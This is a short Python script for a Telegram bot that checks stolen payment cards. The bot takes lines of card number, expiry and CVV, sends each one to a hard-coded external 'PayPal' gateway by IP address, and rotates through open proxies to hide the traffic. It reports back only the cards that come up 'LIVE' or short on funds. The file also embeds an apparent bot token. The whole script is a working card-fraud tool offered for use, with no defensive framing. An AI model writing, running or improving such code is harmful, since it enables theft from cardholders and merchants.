from telebot import TeleBot
import requests

bot = TeleBot("8663863938:AAG1yVZYZLrbRcSIWLBiN7MJFqnmV3i2CqE")

GATEWAY = "http://138.128.240.15:8024/paypal_1?cc="

proxies_list = [
    "http://148.230.4.241:999",
    "http://2.78.60.10:3129",
    "http://1.231.81.166:3128",
    "http://45.167.124.71:999",
    "http://103.157.200.126:3128",
    "http://80.92.204.47:1081"
]

current_proxy = 0

def get_proxy():
    global current_proxy
    proxy = proxies_list[current_proxy % len(proxies_list)]
    current_proxy += 1
    return {"http": proxy, "https": proxy}

@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(m.chat.id, "✅ **PayPal CC Checker + Proxy Rotation**\nSirf LIVE aur INSUFFICIENT dikhega")

@bot.message_handler(func=lambda m: True)
def cc_checker(m):
    for line in m.text.splitlines():
        line = line.strip()
        if not line: continue

        try:
            cc, mm, yy, cvv = line.split("|")
            if len(yy) == 2: yy = "20" + yy

            full_url = GATEWAY + f"{cc}|{mm}|{yy}|{cvv}"
            
            proxy_dict = get_proxy()
            r = requests.get(full_url, proxies=proxy_dict, timeout=25)
            resp = r.text.lower()

            if any(x in resp for x in ["approved", "success", "charged", "live"]):
                bot.reply_to(m, f"✅ **LIVE**\nCC → {cc}|{mm}|{yy}|{cvv}")

            elif any(x in resp for x in ["insufficient", "funds", "limit"]):
                bot.reply_to(m, f"⚠️ **INSUFFICIENT FUNDS**\nCC → {cc}|{mm}|{yy}|{cvv}")

        except:
            pass   # silent on error

bot.infinity_polling()
